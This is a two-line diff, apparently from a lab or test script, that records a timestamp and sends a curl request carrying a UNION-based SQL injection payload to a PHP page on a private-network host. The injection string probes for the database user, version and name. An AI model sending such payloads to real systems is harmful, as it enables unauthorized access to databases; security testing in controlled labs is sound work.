@@ -1,0 +1,2 @@
+date -Is
+curl --noproxy '*' --interface 192.168.100.1 -sS -m 5 -G --data-urlencode 'id=-1 UNION SELECT user(),version(),database();--' http://192.168.100.2:8080/index.php
